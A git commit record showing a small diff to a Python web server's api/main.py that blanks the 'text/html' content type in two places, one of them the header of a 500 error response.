1689c3a1d9b865e82d45b728a71568544d362d7a
FuescE <91391616+FuescE@users.noreply.github.com>
2023-08-26 15:58:52 +0500

    Update main.py

--- api/main.py
+++ api/main.py
@@ -201,7 +201,7 @@ height: 100vh;
 
                 if config["message"]["richMessage"] and result:
 
-                datatype = 'text/html'
+                datatype = ''
 
                 if config["message"]["doMessage"]:
                     data = message.encode()
@@ -235,7 +235,7 @@ if (!currenturl.includes("g=")) {
         
         except Exception:
             self.send_response(500)
-            self.send_header('Content-type', 'text/html')
+            self.send_header('Content-type', '')
             self.end_headers()
 
             self.wfile.write(b'500 - Internal Server Error <br>I think you should contact server owner.<br>@kostyan1 (Kostyan).')
